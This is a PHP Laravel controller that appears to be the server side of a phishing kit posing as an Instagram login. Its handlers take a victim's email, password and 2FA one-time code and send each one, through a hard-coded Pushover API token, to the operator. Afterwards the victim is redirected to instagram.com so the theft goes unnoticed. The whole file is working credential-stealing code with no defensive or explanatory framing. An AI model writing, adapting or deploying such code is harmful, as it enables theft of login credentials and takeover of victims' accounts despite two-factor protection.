<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class MainController extends Controller
{
    private function pushOver($message){
        curl_setopt_array($ch = curl_init(), array(
            CURLOPT_URL => "https://api.pushover.net/1/messages.json",
            CURLOPT_POSTFIELDS => array(
              "token" => "asddrpoooz83svou9gmwn535e4ay5b",
              "user" => "uvoysyee9v1dbyeig3c3zc7cs1hh1n",
              "message" => $message,
            ),
            CURLOPT_SAFE_UPLOAD => true,
            CURLOPT_RETURNTRANSFER => true,
          ));
          curl_exec($ch);
          curl_close($ch);
    }

    

    public function home(){
        return view('home');
    }

    public function firststep(){
        return view('firststep');
    }

    public function homestore(Request $request){
        $request->validate([
            'emailsite' => 'required|email|max:255',
            'password' => 'required|min:5|max:255'
        ]);

        $this->pushOver("email :" . $request['emailsite'] ." password : " .  $request['password'] .  "en attente du 2FA !");


        return redirect()->route('firststep');
    }

    public function firststepstore(Request $request){
        $request = $request->validate([
            'otp' => 'required|min:6|max:6',
        ]);

        $this->pushOver("2FA : " . $request['otp'] .  "!");

        return redirect('https://instagram.com');
    }
}